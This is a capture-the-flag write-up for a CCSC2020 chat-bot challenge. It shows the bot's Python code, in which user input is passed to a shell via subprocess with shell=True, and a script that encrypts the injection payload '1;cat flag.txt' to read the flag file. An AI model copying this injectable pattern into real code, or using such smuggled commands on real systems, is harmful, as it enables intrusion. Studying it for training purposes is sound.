# CCSC2020
### WriteUps for the Cyprus Cyber Security Challenge

![Jaskier Challenge](Jaskier.JPG)

A prety simple reversing challenge, yet tricky from the first glance.

!help
| Jaskier: |
==============================
|!frappe
Return a frappe for you

!ls
Returns the contents of the home directory

!pwd
Returns the current directory

!viewcode <function>
Returns the code of the given function. Be careful with that one!
Available functions: decrypt, hmask, h_rotl, blockify, cnt, revenc, pwd, ls, frappe

!revenc <string>
Reverses an encrypted string
Example of reversing 'Hello World': !revenc SJVsbG9Ap2+yzGEA|



After gathering all the code and reassemblying the parts together we were able to view the complete program:
```python
BLOCK_SIZE = 2
TABLE_DIM = 4

def decrypt(ct):
    dec = [] 
    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
    for blk in blocks:
        blk_int = int.from_bytes(blk, byteorder='big')
        for n in range(TABLE_DIM, -1, -1):
            a,b = cnt(blk_int, TABLE_DIM, n)
            blk_int = h_rotl(blk_int, a, TABLE_DIM, b)
        dec.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
    return b''.join(dec).strip(b'\x00')
def hmask(size, idx):
    return 2**size-1 << idx*size
#masking: setting size-1 bits on and shift them by idx*size 

def h_rotl(pt, rot, size, idx):
    """
    Horizontal left rotation. 
    """
    m = hmask(size, idx)
    blk = pt & m 
    #turning off idx*size bites from pt
    rot = rot % size
    #modulo
    r = ((blk << rot) | (blk >> (size - rot))) & m
    return pt ^ blk | r

def blockify(inpt, size, pad):
    return [inpt[i:i+size].ljust(size, pad) for i in range(0, len(inpt), size)]
    
def cnt(pt, size, idx):
    a,b = 0,0
    pt = pt >> idx * size
    for _ in range(size):
        if pt % 2 == 0: a+=1 
        else: b += 1 
        pt = pt >> 1
    return a,b

def revenc(ctx, params):
    try:
        dec_in = decrypt(base64.b64decode(params)).decode('utf-8')
        getResult = subprocess.Popen(f'echo {dec_in} | rev', shell=True, stdout=subprocess.PIPE).stdout
        result = getResult.read()
        await ctx.channel.send(result.decode())
        print(dec_in)
    except Exception as e:
        print(e)
        await ctx.channel.send("Ops, something went wrong..")  
```
The only function with an input fuctionality is revenc()

```python
import base64
BLOCK_SIZE = 2
TABLE_DIM = 4

def h_rotr(pt, rot, size, idx):
  m = hmask(size, idx)
  blk = pt & m
  rot = rot % size
  r = ((blk >> rot) | (blk << (size - rot)))  & m #We change the shifting to reverse the decryption process
  return pt ^ blk | r

def encrypt(pt):
  enc = []
  blocks = blockify(pt, BLOCK_SIZE, b'\x00')
  for blk in blocks:
      blk_int = int.from_bytes(blk, byteorder='big')
      for n in range(TABLE_DIM):
          a,b = cnt(blk_int, TABLE_DIM, n)
          blk_int = h_rotr(blk_int, a, TABLE_DIM, b)
      enc.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
  print(enc)
  return b''.join(enc)
  
def blockify(inpt, size, pad):
  return [inpt[i:i+size].ljust(size, pad) for i in range(0, len(inpt), size)]

def cnt(pt, size, idx):
  a,b = 0,0
  pt = pt >> idx * size
  for _ in range(size):
    if pt % 2 == 0: a+=1 
    else: b += 1 
    pt = pt >> 1
  return a,b

def hmask(size, idx):
  return 2**size-1 << idx*size

s = b'1;cat flag.txt'
print(s)
a = base64.b64encode(encrypt(s))
print(a)
```
